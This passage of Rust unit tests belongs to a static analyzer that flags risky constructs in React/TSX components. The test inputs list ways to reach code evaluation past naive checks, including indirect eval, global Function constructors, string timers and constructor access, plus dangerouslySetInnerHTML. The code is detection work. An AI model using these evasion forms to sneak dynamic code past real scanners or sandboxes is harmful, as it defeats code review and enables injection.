            "export default function Promo({ k }: { k: string }) {\n  const a = window[k]\n  const b = ({} as any)['constructor']\n  const c = a.constructor\n  const d = eval('1')\n  const e = new Function('return 1')\n  import('./x')\n  return <i>{[1][0]}</i>\n}\n",
        );
        let kinds: Vec<_> = f.risky.iter().map(|r| (r.kind, r.line)).collect();
        assert_eq!(
            kinds,
            vec![
                ("computed-member", 2),
                ("constructor-access", 3),
                ("constructor-access", 4),
                ("eval", 5),
                ("eval", 6),
                ("dynamic-import", 7)
            ]
        );
        assert!(f.imports.iter().any(|i| i.specifier == "./x"));
    }

    #[test]
    fn type_only_imports_are_erased_and_a_source_that_does_not_parse_has_no_facts() {
        let f = facts(
            "import type { Foo } from './nope'\nimport { x } from './x'\nexport default function Promo() {\n  return <p>{x}</p>\n}\n",
        );
        assert_eq!(
            f.imports
                .iter()
                .map(|i| i.specifier.as_str())
                .collect::<Vec<_>>(),
            vec!["./x"]
        );
        assert!(
            crate::parse::run_on_compiler_thread(|| read_source(
                "a.tsx",
                b"export default function (".to_vec()
            ))
            .is_none()
        );
    }
}

#[cfg(test)]
mod hardening_tests {
    use super::*;

    fn facts(src: &str) -> Facts {
        crate::parse::run_on_compiler_thread(|| {
            read_source("el/Promo.tsx", src.as_bytes().to_vec()).expect("the source parses")
        })
    }

    #[test]
    fn eval_reached_through_a_global_object_a_sequence_or_a_string_timer_is_found() {
        let f = facts(
            "export default function Promo() {\n  window.eval('1')\n  globalThis['Function']('return 1')()\n  ;(0, eval)('2')\n  new self.Function('3')\n  setTimeout('4', 1)\n  window.setInterval(`5`, 1)\n  setTimeout(() => 1, 1)\n  setTimeout(go, 1)\n  return <i>x</i>\n}\nconst go = () => 1\n",
        );
        let lines: Vec<_> = f
            .risky
            .iter()
            .filter(|r| r.kind == "eval")
            .map(|r| r.line)
            .collect();
        assert_eq!(lines, vec![2, 3, 4, 5, 6, 7], "{:?}", f.risky);
    }

    #[test]
    fn an_element_written_as_a_direct_runtime_call_counts_like_jsx() {
        let f = facts(
            "import { createElement } from 'react'\nimport { jsx } from 'react/jsx-runtime'\nimport * as R from 'react'\nexport default function Promo({ html }: { html: string }) {\n  return [createElement('div', { dangerouslySetInnerHTML: { __html: html }, onClick: () => fetch('/x') }), jsx('a', { ...{} }), R.createElement('b', { ref: null })]\n}\n",
        );
        assert!(f.raw_html && f.spreads);
        assert!(
            f.imports.iter().any(|i| i.specifier == "react/jsx-runtime"),
            "{:?}",
            f.imports
        );
        assert!(f.tags.contains(&"div".to_string()) && f.tags.contains(&"b".to_string()));
        assert!(f.attrs.contains(&"ref".to_string()));
        assert!(
            f.handlers
                .iter()
                .any(|h| h.callees.iter().any(|c| c.name == "fetch")),
            "{:?}",
            f.handlers
        );
        // Written JSX alone does not list the runtime import the parser adds.
        assert!(
            facts("export default function Promo() {\n  return <p>x</p>\n}\n")
                .imports
                .is_empty()
        );
    }
}

#[cfg(test)]
mod ts_only_tests {
    use super::*;

    #[test]
    fn a_namespace_body_and_an_enum_initializer_are_walked() {
        let f = crate::parse::run_on_compiler_thread(|| {
            read_source(
                "el/Promo.tsx",
                b"namespace N {\n  export const a = import('./ns')\n}\nenum E {\n  A = fetch('/e').length,\n}\nexport default function Promo() {\n  return <p>{N.a ? E.A : 0}</p>\n}\n".to_vec(),
            )
            .expect("the source parses")
        });
        assert!(f.globals.contains(&"fetch".to_string()), "{:?}", f.globals);
        assert!(
            f.risky.iter().any(|r| r.kind == "dynamic-import"),
            "{:?}",
            f.risky
        );
        assert!(
            f.imports.iter().any(|i| i.specifier == "./ns"),
            "{:?}",
            f.imports
        );
    }
}
